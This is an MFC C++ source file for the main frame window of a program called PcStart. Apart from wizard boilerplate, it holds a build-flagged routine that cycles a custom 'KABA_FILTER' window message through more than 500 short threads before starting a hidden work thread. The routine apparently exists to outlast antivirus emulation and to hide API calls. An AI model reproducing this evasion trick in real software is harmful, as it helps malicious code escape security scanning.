// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "PcStart.h"

#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define WM_KABA_FILTER	WM_USER + 100

#ifdef PS_VER_DINGZUO
DWORD nCount = 0;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

//IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code !
	ON_WM_CREATE()
	//}}AFX_MSG_MAP
#ifdef PS_VER_DINGZUO
	ON_MESSAGE(WM_KABA_FILTER, OnKabaFilter)
#endif
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	
}

CMainFrame::~CMainFrame()
{

}

#ifdef PS_VER_DINGZUO
DWORD GetMessageThread(LPVOID lPvoid)
{
	m_gFunc.Sleep(1);
	m_gFunc.PostMessage((HWND) lPvoid, WM_KABA_FILTER, 0, 0);
	return 0;
}

LRESULT CMainFrame::OnKabaFilter(WPARAM wParam, LPARAM lParam)
{
	if(nCount ++ > 500)
	{
		m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) WorkThread, (LPVOID) ::AfxGetApp()->m_lpCmdLine, 0, NULL);
	}
	else
	{
		m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) GetMessageThread, (LPVOID) GetSafeHwnd(), 0, NULL);
	}
	return TRUE;
}
#endif

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	
#ifdef PS_VER_DINGZUO
	m_gFunc.PostMessage(m_hWnd, WM_KABA_FILTER, 0, 0);
#endif

	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

